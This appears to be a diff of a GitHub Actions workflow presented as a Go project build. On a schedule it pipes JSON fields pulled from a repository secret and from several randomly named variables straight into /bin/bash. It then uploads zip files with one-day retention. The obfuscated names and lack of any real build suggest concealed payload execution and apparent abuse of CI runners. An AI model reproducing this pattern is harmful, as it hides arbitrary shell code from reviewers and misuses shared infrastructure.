@@ -1,29 +1,26 @@
 name: thomasgolangmodern
 on:
   workflow_dispatch:
+
   schedule:
-    - cron: '49 1/6 * * *'
+    - cron: '3 3,9,15,21 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: thomasgolangmodern
         env:
-          vyoz144: ${{ secrets.vyoz144 }}
+          d125: ${{ secrets.d125 }}
         run: |
-          echo $vyoz144 | jq -r .bz703 | /bin/bash
-          echo $bknz03 | jq -r .oqca037 | /bin/bash
-          echo $gn9198 | jq -r .b45 | /bin/bash
-          echo $zybt5857 | jq -r .lzj5359 | /bin/bash
-          echo $ojy37368 | jq -r .xuoa69 | /bin/bash
-          echo $rbpd81 | jq -r .xwmi386 | /bin/bash
-          echo $zms425 | jq -r .euilw9 | /bin/bash
-          echo $o8438 | jq -r .ao0 | /bin/bash
-          echo $fb41 | jq -r .krdhi856 | /bin/bash
-          echo $zub59 | jq -r .vmd53084 | /bin/bash
-          echo $dt1 | jq -r .f448 | /bin/bash
-          echo $ym45741 | jq -r .ulkq191 | /bin/bash
-          echo $krc2 | jq -r .cgs9 | /bin/bash
+          printf '%s' "$d125" | jq -r .m61 | /bin/bash
+          echo $gkzdx4589 | jq -r .ayt2775 | /bin/bash
+          echo $tzu9 | jq -r .rxaz0 | /bin/bash
+          printf '%s' "$oqqdk9" | jq -r .w1 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: 2ZiPvSb7
+          path: "*.zip"
+          retention-days: 1
